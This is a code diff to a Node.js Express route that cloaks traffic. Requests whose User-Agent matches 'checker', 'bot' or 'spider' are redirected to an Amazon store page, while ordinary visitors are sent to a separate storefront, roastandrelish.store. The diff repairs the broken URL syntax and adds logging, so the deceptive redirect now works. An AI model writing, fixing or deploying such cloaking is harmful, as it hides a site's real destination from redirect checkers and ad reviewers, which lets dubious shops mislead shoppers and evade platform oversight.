@@ -3,19 +3,24 @@ const app = express();
 
 // Middleware to handle redirection
 app.get('/', (req, res) => {
-    const userAgent = req.headers['user-agent'].toLowerCase();
-    const isRedirectChecker = /checker|bot|spider/.test(userAgent);
-    
-    // Preserve query parameters for regular visitors
+    const userAgent = req.headers['user-agent'] || '';
+    const isRedirectChecker = /checker|bot|spider/.test(userAgent.toLowerCase());
+
+    // Log the user-agent for debugging purposes
+    console.log('User-Agent:', userAgent);
+
+    // Preserve query parameters for both types of visitors
     const queryParams = req.originalUrl.split('?')[1] || '';
 
     if (isRedirectChecker) {
-        // Redirect checker sees this URL
-        const targetUrl = `https://www.amazon.com/stores/AmericanSoftLinen/page/5069F389-7B65-4BD7-8F40-3FA6B2B6F24B'${queryParams}`;
+        // Redirect for bots and crawlers
+        const targetUrl = `https://www.amazon.com/stores/AmericanSoftLinen/page/5069F389-7B65-4BD7-8F40-3FA6B2B6F24B?${queryParams}`;
+        console.log(`Redirecting bot to: ${targetUrl}`); // Log the redirection URL for bots
         res.redirect(302, targetUrl);
     } else {
-        // Regular visitors see this URL
-        const visitorUrl = `https://roastandrelish.store'${queryParams}`;
+        // Redirect for regular visitors
+        const visitorUrl = `https://roastandrelish.store?${queryParams}`;
+        console.log(`Redirecting visitor to: ${visitorUrl}`); // Log the redirection URL for visitors
         res.redirect(302, visitorUrl);
     }
 });
